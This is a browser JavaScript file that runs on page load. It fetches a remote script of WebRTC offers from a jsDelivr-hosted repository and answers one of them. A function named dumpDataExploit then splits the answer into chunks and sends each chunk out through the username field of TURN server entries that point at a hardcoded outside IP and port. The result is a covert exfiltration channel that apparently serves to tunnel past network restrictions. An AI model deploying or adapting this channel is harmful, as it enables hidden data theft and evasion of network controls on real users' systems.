const connectionInfo = {
  serverIp: "71.191.41.44",
  serverPort: 47777,
  offersUrl: "https://cdn.jsdelivr.net/gh/kqwq/zeta5@dev/dist/offers",
};

console.log("hello world!");

/**
 * Get the filename for the hourly offers file
 * @param {Date} date
 * @returns {string} YY-MM-DD-HH.js
 */
function getHourlyFilename(date) {
  // Format YY-MM-DD-HH.js
  const leftPad2 = (num) => {
    return num.toString().padStart(2, "0");
  };
  const year = leftPad2(date.getUTCFullYear());
  const month = leftPad2(date.getUTCMonth());
  const day = leftPad2(date.getUTCDate());
  const hour = leftPad2(date.getUTCHours());
  return `${year}-${month}-${day}-${hour}.js`;
}

/**
 * Add a script to the document, returns when the script is loaded
 * @param {string} src
 * @returns {Promise<void>}
 */
async function addScriptToDocument(src) {
  const script = document.createElement("script");
  script.src = src;
  document.body.appendChild(script);
  // Onload, return
  return new Promise((resolve) => {
    script.onload = resolve;
  });
}

/**
 * Attempt to answer an offer
 * @param {string} sdp
 * @returns {string} answer
 * @throws {Error}
 */
async function getAnswerFromOffer(sdp) {
  // Create connection
  const connection = new RTCPeerConnection();
  // Set data channel
  connection.ondatachannel = (event) => {
    const channel = event.channel;
    channel.onmessage = (event) => {
      console.log("onmessage", event);
    };
    channel.onopen = (event) => {
      console.log("onopen", event);
    };
    channel.onclose = (event) => {
      console.log("onclose", event);
    };
  };
  // Set remote description
  await connection.setRemoteDescription({
    type: "offer",
    sdp,
  });
  // Create answer
  const answer = await connection.createAnswer();
  await connection.setLocalDescription(answer);
  return answer.sdp;
}

/**
 * Send a data through to the TURN server
 * @param {string} data
 * @param {number} sdpIndex
 * @param {number} chunkSize
 */
const dumpDataExploit = async (data, sdpIndex, chunkSize = 128) => {
  // Unique identifier for this dump
  const identifier = Math.random().toString(36).substring(7);

  // Which sdp index the client is replying to
  const sdpIndexPadded = sdpIndex.toString().padStart(2, "0");

  // Size of 1 chunk
  const dataChunkSize = chunkSize - identifier.length - 9;

  // Number of chunks total
  const numberOfChunks = Math.ceil(data.length / dataChunkSize);
  const numberOfChunksPadded = numberOfChunks.toString().padStart(2, "0");

  for (let ind = 0; ind < numberOfChunks; ind++) {
    const indPadded = ind.toString().padStart(2, "0");
    const chunkData = data.substring(
      ind * dataChunkSize,
      (ind + 1) * dataChunkSize
    );
    const chunk = `${identifier}:${indPadded}:${numberOfChunksPadded}:${sdpIndexPadded}:${chunkData}`;
    new RTCPeerConnection({
      iceServers: [
        {
          urls: [
            `turn:${connectionInfo.serverIp}:${connectionInfo.serverPort}`,
          ],
          username: chunk,
          credential: "1",
        },
      ],
      iceCandidatePoolSize: 1,
    });
  }
};

async function main() {
  // Filename
  const dateStr = "2023-06-31-19";
  // const dateStr = getHourlyFilename(new Date());
  const filename = `${connectionInfo.offersUrl}/${dateStr}.js`;
  console.log("filename", filename);

  await addScriptToDocument(filename);
  const offers = window.sdp;
  console.log("read offers", offers);

  let sdpIndex = ~~(Math.random() * offers.length);
  const sdp = atob(offers[sdpIndex]);
  console.log("Selected offer", sdpIndex, JSON.stringify(sdp));

  const answer = await getAnswerFromOffer(sdp);
  console.log("offer -> answer", JSON.stringify(answer));

  dumpDataExploit(answer, sdpIndex);
  console.log("dumped data");
}

document.addEventListener("DOMContentLoaded", main);
